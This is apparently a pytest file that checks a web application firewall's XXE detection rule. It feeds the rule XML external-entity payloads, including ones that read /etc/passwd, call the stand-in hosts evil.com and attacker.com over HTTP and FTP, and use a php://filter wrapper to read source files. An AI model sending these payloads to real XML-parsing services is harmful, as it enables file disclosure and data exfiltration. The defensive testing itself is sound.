from bastion.core.normalizer import normalize_request
from bastion.rules.xxe import XXERule


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_request(method="POST", path="/", query_string="", headers=None, body=b""):
    return normalize_request(
        method,
        path=path,
        query_string=query_string,
        headers=headers or {
            "host": "example.com",
            "content-type": "application/xml",
        },
        body=body,
    )


def _xxe_verdict(body=b"", query_string="", path="/"):
    request = _make_request(body=body, query_string=query_string, path=path)
    return XXERule().match(request)


# ---------------------------------------------------------------------------
# XXERule (953100)
# ---------------------------------------------------------------------------


def test_xxe_entity_system_file_blocked():
    payload = b"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>"""
    verdict = _xxe_verdict(body=payload)
    assert verdict.blocked
    assert verdict.rule_id == "953100"


def test_xxe_parameter_entity_http_blocked():
    payload = b"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/">%xxe;]>
<root/>"""
    verdict = _xxe_verdict(body=payload)
    assert verdict.blocked
    assert verdict.rule_id == "953100"


def test_xxe_entity_public_blocked():
    payload = b'<!ENTITY foo PUBLIC "-//OASIS//DTD DocBook XML V4.5//EN" "http://evil.com/">'
    verdict = _xxe_verdict(body=payload)
    assert verdict.blocked
    assert verdict.rule_id == "953100"


def test_xxe_url_encoded_doctype_blocked():
    # %3C%21DOCTYPE URL-encoded
    verdict = _xxe_verdict(query_string="data=%3C%21DOCTYPE+foo+%5B%5D%3E")
    assert verdict.blocked
    assert verdict.rule_id == "953100"


def test_xxe_system_ftp_blocked():
    payload = b'<!ENTITY xxe SYSTEM "ftp://attacker.com/file">'
    verdict = _xxe_verdict(body=payload)
    assert verdict.blocked
    assert verdict.rule_id == "953100"


def test_xxe_system_php_wrapper_blocked():
    payload = b'<!ENTITY src SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">'
    verdict = _xxe_verdict(body=payload)
    assert verdict.blocked
    assert verdict.rule_id == "953100"


def test_xxe_clean_xml_allowed():
    payload = b"""<?xml version="1.0" encoding="UTF-8"?>
<root>
  <item>value</item>
  <item>another value</item>
</root>"""
    verdict = _xxe_verdict(body=payload)
    assert not verdict.blocked


def test_xxe_clean_query_allowed():
    verdict = _xxe_verdict(query_string="format=xml&id=42")
    assert not verdict.blocked
